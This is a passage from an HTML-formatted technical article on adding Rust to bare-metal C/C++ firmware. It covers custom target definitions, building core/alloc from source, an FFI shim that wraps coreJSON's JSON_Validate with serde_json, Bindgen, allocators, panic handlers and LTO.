10pt; vertical-align: baseline;">:</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"> </span><span style="background-color: transparent; color: #c53929; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">8</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #0f9d58; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">"crt-objects-fallback"</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">:</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"> </span><span style="background-color: transparent; color: #0f9d58; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">"false"</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #0f9d58; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">"data-layout"</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">:</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"> </span><span style="background-color: transparent; color: #0f9d58; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">"e-m:e-p:32:32-Fi8-i64:64-v128:64:128-a:0:32-n32-S64"</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">[...]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">}</span></p></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">This output can provide a starting point for defining your target. Of particular note, the data-layout field is defined in the </span><a href="https://llvm.org/docs/LangRef.html#data-layout"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">LLVM documentation</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Once the target is defined, </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">libcore</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> and </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">liballoc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> (and </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">libstd</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, if applicable) must be built from source for the newly defined target. If using Cargo, building with </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">-Z build-std</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> accomplishes this, indicating that these libraries should be built from source for your target along with your crate module:</span></p><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;"># set build-std to the list of libraries needed</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">cargo build </span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">Z build</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">-</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">std</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">=</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">core</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">,</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">alloc </span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">--</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">target my_target</span><span style="background-color: transparent; color: #616161; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">.</span><span style="background-color: transparent; font-family: Consolas, sans-serif; font-size: 10pt; vertical-align: baseline;">json</span></p></td></tr></tbody></table></div><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Building Rust With LLVM Prebuilts</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">If the bare-metal architecture is not supported by the LLVM bundled internal to the Rust toolchain, a custom Rust toolchain can be produced with any LLVM prebuilts that support the target.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">The instructions for building a Rust toolchain can be found in detail in the </span><a href="https://rustc-dev-guide.rust-lang.org/building/how-to-build-and-run.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Rust Compiler Developer Guide</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">. In the </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">config.toml</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, </span><a href="https://github.com/rust-lang/rust/blob/036b38ced36b0ed16579f95b4647ba7424f6b1bc/config.example.toml#L790-L793"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">llvm-config</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> must be set to the path of the LLVM prebuilts.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">You can find the latest Rust Toolchain supported by a particular version of LLVM by checking the </span><a href="https://github.com/rust-lang/rust/blob/master/RELEASES.md"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">release notes</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> and looking for releases which bump up the minimum supported LLVM version. For example, Rust </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">1.76</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> bumped the </span><a href="https://github.com/rust-lang/rust/blob/master/RELEASES.md"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">minimum LLVM to 16</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> and </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">1.73</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> bumped the </span><a href="https://github.com/rust-lang/rust/blob/master/RELEASES.md"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">minimum LLVM to 15</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">. That means with LLVM15 prebuilts, the latest Rust toolchain that can be built is </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">1.75</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 20pt;"><span style="font-family: Arial, sans-serif; font-size: 20pt; font-weight: 400; vertical-align: baseline;">Creating a Drop-In Rust Shim</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">To create a drop-in replacement for the C/C++ function or API being replaced, the shim needs two things: it must provide the same API as the replaced library and it must know how to run in the firmware’s bare-metal environment.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Exposing the Same API</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">The first is achieved by defining a Rust FFI interface with the same function signatures.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">We try to keep the amount of unsafe Rust as minimal as possible by putting the actual implementation in a safe function and exposing a thin wrapper type around.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">For example, the FreeRTOS </span><a href="https://github.com/FreeRTOS/coreJSON?tab=readme-ov-file#reference-example"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">coreJSON example</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> includes a </span><a href="https://github.com/FreeRTOS/coreJSON/blob/9ebaeb55cce39a6f79da9cceaa0cbc664a462c8b/source/include/core_json.h#L101-L102"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">JSON_Validate</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> C function with the following signature:</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>JSONStatus_t</span><span> </span><span>JSON_Validate(</span><span> </span><span>const</span><span> </span><span>char</span><span> </span><span>*</span><span> </span><span>buf,</span><span> </span><span>size_t</span><span> </span><span>max</span><span> </span><span>);</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">We can write a shim in Rust between it and the memory safe </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">serde_json</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> crate to expose the C function signature. We try to keep the unsafe code to a minimum and call through to a safe function early:</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>#[no_mangle]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>pub</span><span> </span><span>unsafe</span><span> </span><span>extern</span><span> </span><span>"C"</span><span> </span><span>fn</span><span> </span><span>JSON_Validate(buf:</span><span> </span><span>*const</span><span> </span><span>c_char,</span><span> </span><span>len:</span><span> </span><span>usize)</span><span> </span><span>-&gt;</span><span> </span><span>JSONStatus_t</span><span> </span><span>{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>buf.is_null()</span><span> </span><span>{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>JSONStatus::JSONNullParameter</span><span> </span><span>as</span><span> </span><span>_</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> </span><span>len</span><span> </span><span>==</span><span> </span><span>0</span><span> </span><span>{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>JSONStatus::JSONBadParameter</span><span> </span><span>as</span><span> </span><span>_</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>}</span><span> </span><span>else</span><span> </span><span>{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>json_validate(slice_from_raw_parts(buf</span><span> </span><span>as</span><span> </span><span>_,</span><span> </span><span>len).as_ref().unwrap())</span><span> </span><span>as</span><span> </span><span>_</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>// No more unsafe code in here.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>fn</span><span> </span><span>json_validate(buf:</span><span> </span><span>&amp;[u8])</span><span> </span><span>-&gt;</span><span> </span><span>JSONStatus</span><span> </span><span>{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>serde_json::from_slice::&lt;Value&gt;(buf).is_ok()</span><span> </span><span>{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>JSONStatus::JSONSuccess</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>}</span><span> </span><span>else</span><span> </span><span>{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>ILLEGAL_DOC</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>}</span></p><br /><br /><div align="left" dir="ltr"><table style="border-collapse: collapse; border: none;"><colgroup><col width="70" /><col width="905" /></colgroup><tbody><tr style="height: 54.75pt;"><td style="background-color: #e1f5fe; overflow: hidden; padding: 14.4pt 14.4pt 14.4pt 14.4pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #01579b; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"><span style="border: none; display: inline-block; height: 24px; overflow: hidden; width: 24px;"><img height="24" src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXfPgBmsZj6ZTOto6Frw_NToC18UKVimJ8SHuCerE7W01D83L3qeJ-Qop83lTf1pvDshgc4CW3pap9aXpzVpSQZtG9EVZDzIQKD5x3vZ4yiEGDxMODTUTNZtlGMVy3Sh-I1i4x-QY8RzBAaqOSap6rGuC9WYg4pdhUO5vY_-OqUCcPssnZAYmUKb-FnV5Ainemg?key=NlrS0k5AvJIpHEA9_mIwTQ" style="margin-left: 0px; margin-top: 0px;" width="24" /></span></span></p></td><td style="background-color: #e1f5fe; overflow: hidden; padding: 14.4pt 14.4pt 14.4pt 14.4pt; vertical-align: middle;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #01579b; font-family: Arial, sans-serif; font-size: 11pt; font-weight: 700; vertical-align: baseline;">Note:</span><span style="background-color: transparent; color: #01579b; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> This is a very simple example. For a highly resource constrained target, you can avoid </span><span style="background-color: transparent; color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="background-color: transparent; color: #01579b; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> and use </span><a href="https://docs.rs/serde-json-core/latest/serde_json_core"><span style="background-color: transparent; color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">serde_json_core</span></a><span style="background-color: transparent; color: #01579b; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, which has even lower overhead but requires pre-defining the JSON structure so it can be allocated on the stack.</span></p></td></tr></tbody></table></div><br /><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">For further details on how to create an FFI interface, </span><a href="https://doc.rust-lang.org/nomicon/ffi.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">the Rustinomicon covers this topic extensively</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Calling Back to C/C++ Code</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">In order for any Rust component to be functional within a C-based firmware, it will need to call back into the C code for things such as allocations or logging. Thankfully, there are a variety of tools available which automatically generate Rust FFI bindings to C. That way, C functions can easily be invoked from Rust.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">The standard means of doing this is with the </span><a href="https://github.com/rust-lang/rust-bindgen"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Bindgen</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> tool. You can use Bindgen to parse all relevant C headers that define the functions Rust needs to call into. It's important to invoke Bindgen with the same </span><span style="color: #0f9d58; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">CFLAGS</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> as the code in question is built with, to ensure that the bindings are generated correctly.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Experimental support for producing </span><a href="https://github.com/rust-lang/rust-bindgen/discussions/2405"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">bindings to static inline functions</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> is also available.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Hooking Up The Firmware’s Bare-Metal Environment</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Next we need to hook up Rust panic handlers, global allocators, and critical section handlers to the existing code base. This requires producing definitions for each of these which call into the existing firmware C functions.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">The Rust panic handler must be defined to handle unexpected states or failed assertions. A custom panic handler can be defined via the </span><a href="https://doc.rust-lang.org/nomicon/panic-handler.html"><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">panic_handler</span><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> attribute</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">. This is specific to the target and should, in most cases, either point to an abort function for the current task/process, or a panic function provided by the environment.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">If an allocator is available in the firmware and the crate relies on the </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> crate, the Rust allocator can be hooked up by </span><a href="https://doc.rust-lang.org/stable/core/alloc/trait.GlobalAlloc.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">defining a global allocator implementing GlobalAlloc</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">If the crate in question relies on concurrency, critical sections will need to be handled. Rust's </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">core</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> or </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> crates do not directly provide a means for defining this, however the </span><a href="https://docs.rs/critical-section/latest/critical_section/"><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">critical_section</span><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> crate</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> is commonly used to handle this functionality for a number of architectures, and can be extended to support more.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">It can be useful to hook up functions for logging as well. Simple wrappers around the firmware’s existing logging functions can expose these to Rust and be used in place of </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">print</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> or </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">eprint </span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">and the like. A convenient option is to </span><a href="https://google.github.io/comprehensive-rust/bare-metal/aps/logging.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">implement the </span><span style="color: #0f9d58; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Log</span><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> trait</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 18pt;"><span style="font-family: Arial, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Fallible Allocations and </span><span>alloc</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Rusts </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> crate normally assumes that allocations are infallible (that is, memory allocations won’t fail). However due to memory constraints this isn’t true in most bare-metal environments. Under normal circumstances </span><a href="https://doc.rust-lang.org/stable/std/alloc/fn.handle_alloc_error.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Rust panics and/or aborts</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> when an allocation fails; this may be acceptable behavior for some bare-metal environments, in which case there are no further considerations when using </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">If there’s a clear justification or requirement for fallible allocations however, additional effort is required to ensure that either allocations can’t fail or that failures are handled.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">One approach is to use a crate that provides statically allocated fallible collections, such as the </span><a href="https://docs.rs/heapless/latest/heapless/index.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">heapless</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> crate, or dynamic fallible allocations like </span><a href="https://docs.rs/fallible_vec/latest/fallible_vec/"><span style="color: #0f9d58; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">fallible_vec</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">. Another is to exclusively use </span><span style="color: #0f9d58; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">try_*</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> methods such as </span><span style="color: #0f9d58; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Vec::try_reserve</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">, which check if the allocation is possible.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Rust is in the process of formalizing better support for fallible allocations, with an </span><a href="https://doc.rust-lang.org/std/alloc/trait.Allocator.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">experimental allocator in nightly</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> allowing </span><a href="https://doc.rust-lang.org/std/alloc/struct.AllocError.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">failed allocations</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> to be handled by the implementation. There is also the unstable cfg flag for </span><span style="color: #0d904f; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">alloc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> called </span><a href="https://github.com/rust-lang/rust/pull/84266"><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">no_global_oom_handling</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> which removes the infallible methods, ensuring they are not used.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Build Optimizations</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Building the Rust library with LTO is necessary to optimize for code size. The existing C/C++ code base does not need to be built with LTO when passing </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">-C lto=true</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> to </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">rustc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">. Additionally, setting 